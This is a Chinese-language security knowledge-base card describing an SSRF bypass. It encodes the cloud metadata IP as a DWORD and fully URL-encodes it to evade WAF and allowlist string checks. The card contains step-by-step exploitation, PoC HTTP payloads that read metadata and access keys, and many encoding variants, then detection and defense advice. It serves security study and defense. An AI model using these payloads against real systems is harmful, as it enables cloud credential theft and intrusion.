---
id: web-generic-ssrf-multi-layer-decode-dword-waf-bypass
title: 多层解码错位：完整 URL 编码的 DWORD 绕过 WAF 访问云 metadata
type: scenario
domain: web
path: web/generic/ssrf
technique: multi-layer-decode-ip-notation-bypass
aliases:
- DWORD 全编码绕过 WAF
- 多层解码 SSRF
- 2852039166 SSRF
- URL 编码 DWORD
- WAF 原始字符串检查绕过
- 域名白名单 + DWORD 绕过
tags:
- ssrf
- waf-bypass
- url-encoding
- ip-notation
- dword
- cloud-metadata
- allowlist-bypass
- multi-layer-decode
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T11:52:37+08:00'
  notes: 已对照原文与8张图核对：标准 169.254.169.254、userinfo、nip.io 均返回 403；DWORD 2852039166 返回 200 且响应含 access-key/secret-key；完整 URL 编码 %32%38%35%32%30%33%39%31%36%36 同样返回 200，卡内原理/步骤/PoC 与原文一致。未验证点：PoC 未在本机执行；原文未给目标组件版本，未设 affected_versions；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

当 WAF/白名单只检查原始 URL 字符串、而后端先做百分号解码再交给标准 URL 解析器时，把云 metadata 的 IP 写成 DWORD 十进制（`169.254.169.254` → `2852039166`）并进一步整体 URL 编码（`%32%38%35%32%30%33%39%31%36%36`），原始字符串不命中任何 IP 规则，后端解码后仍会把它归一化为 `169.254.169.254` 并发出请求，形成绕过 WAF 的 SSRF。

## 原理

- IPv4 可用一个 32 位无符号整数表示：`169.254.169.254` = 169×256³ + 254×256² + 169×256 + 254 = `2852039166`。标准 URL 解析器（WHATWG、Node、curl 等）会把纯数字 host 按 IPv4 规则归一化，实际连接仍到 `169.254.169.254`。
- 第一层错位是“字符串规则 vs 语义地址”：WAF 规则匹配 `169.254.169.254`、`127.0.0.1` 等字面量，看到 `2852039166` 不命中；后端解析器却把它还原为 metadata 地址。
- 第二层错位是“原始字符串 vs 解码后字符串”：WAF 若只检查请求中的原始 URL，`%32%38%35...` 是一串百分号，不命中 IP 规则；后端在进入 URL 解析前先做百分号解码，得到 `2852039166`，再归一化为 `169.254.169.254`。
- 每多一层编码/解码，就多一次“检查端与执行端看到不同内容”的机会；同理还有十六进制、八进制、IPv6 映射、省略段、`127.0.0.0/8` 内其他回环地址等等价写法。
- 该手法不依赖某个库的漏洞，而是利用“检查逻辑与请求逻辑不是同一套解析/解码”的结构性问题；WAF 规则再全，只要它检查的字符串不是后端最终连接的地址，就存在缺口。
- 文章中的实测链路：缩略图接口只允许 `img.example.com`，标准 metadata 地址被拦、`allowed@169.254.169.254` 被拦、`169.254.169.254.nip.io` 被拦，但 `2852039166` 成功返回 metadata；更严格的一层用完整 URL 编码的 DWORD 也成功，响应中出现 access-key/secret-key 字段。

## 触发条件

- 存在服务端 URL 抓取入口（缩略图、图片代理、URL 预览、Webhook 等），且允许用户控制 URL。
- 防护由 WAF、域名白名单或字符串黑名单组成，检查的是原始 URL 或解码前的字符串。
- 后端会对 URL 做百分号解码，并使用标准 URL 解析器/HTTP 客户端（会把数字 host 归一化为 IPv4）。
- 目标服务器可访问云 metadata（如 `169.254.169.254`）或内网地址。

## 利用步骤

1. 用标准 metadata 地址做基线，确认被 WAF/白名单拦截（如返回“域名不在白名单中”）。
2. 尝试 `http://<allowed-domain>@169.254.169.254/...`，确认 userinfo 混淆是否被单独拦截。
3. 尝试 `http://169.254.169.254.nip.io/...`，确认通配 DNS 是否被拦截。
4. 把 metadata IP 换成 DWORD：`http://2852039166/latest/meta-data/`，观察是否返回内容。
5. 若 DWORD 字面量也被规则覆盖，整体 URL 编码：`http://%32%38%35%32%30%33%39%31%36%36/latest/meta-data/`，让 WAF 只看到百分号串。
6. 读取 metadata 敏感端点；若实例绑定角色，继续读临时凭证；若目标是内网服务，替换为对应 `IP:端口` 的 DWORD/编码形式做探测。

## PoC

```http
POST /api/thumbnail HTTP/1.1
Host: target
Content-Type: application/json

{"url": "http://2852039166/latest/meta-data/"}
```

```http
POST /api/thumbnail HTTP/1.1
Host: target
Content-Type: application/json

{"url": "http://%32%38%35%32%30%33%39%31%36%36/latest/meta-data/"}
```

```text
# 响应中出现 metadata 内容或 access-key/secret-key 字段，说明绕过成功
```

等价 IP 换算：

```python
parts = [169, 254, 169, 254]
dword = parts[0]*256**3 + parts[1]*256**2 + parts[2]*256 + parts[3]  # 2852039166
```

## 变体与关联

- 变体：十六进制 `0xa9.0xfe.0xa9.0xfe`、八进制 `0251.0376.0251.0376`、IPv6 映射 `[::ffff:169.254.169.254]`、省略段 `169.254.117758` 等等价写法，按目标解析器支持程度尝试。
- 变体：`127.0.0.0/8` 整个段都是回环，拦了 `127.0.0.1` 仍可用 `127.0.0.2`、`127.1.2.3`。
- 变体：双重编码 `%25%33%32...`，针对只解码一次或只检查解码一次的链路；不同层解码次数不同会产生更多错位。
- 变体：nip.io/localtest.me/lvh.me 等通配 DNS 把 IP 藏进域名；若 WAF 拦域名后缀，可再叠加 DWORD/编码。
- 变体：DNS rebinding 让校验时解析到公网、连接时解析到内网；与编码错位可组合。
- 关联：[[web-generic-ssrf-ip-notation-blacklist-bypass]]（等价 IP 表示绕过字符串黑名单）、[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]（解析器分歧）、[[web-generic-ssrf-url-userinfo-prefix-allowlist-bypass]]（userinfo 混淆）。
- 边界：后端若在解码后先规范化 host、再对最终 IP 做私网/链路本地校验，并在连接时复用该 IP，则本手法不成立；WAF 若对多层解码后的结果做语义解析，也能拦截。

## 检测与防御

- 检测：URL 主机部分出现纯数字、`0x`、前导零、超长十进制、`%` 编码的 host，或 `@`、`nip.io` 等混淆；同一参数出现“解码后变成内网地址”的情况。
- 检测：不要只匹配原始字符串中的 `169.254.169.254`；应在解码、规范化后取 hostname，再做 DNS 解析，按真实目的 IP 判断回环、私网、链路本地（`169.254.0.0/16`）。
- 防御：校验与请求使用同一套解析/解码逻辑（same-parser 原则）；不要用自定义 URL 解析器做安全判断。
- 防御：在真正连接前固定解析出的 IP，禁止重定向或逐跳重新校验；出站默认拒绝，只放行必要目的地。
- 加固：把 DWORD、十六进制、八进制、IPv6 映射、完整 URL 编码、双重编码、userinfo、通配 DNS 等用例写成“必须拦截”的回归测试；云 metadata 使用 IMDSv2 与最小权限角色。
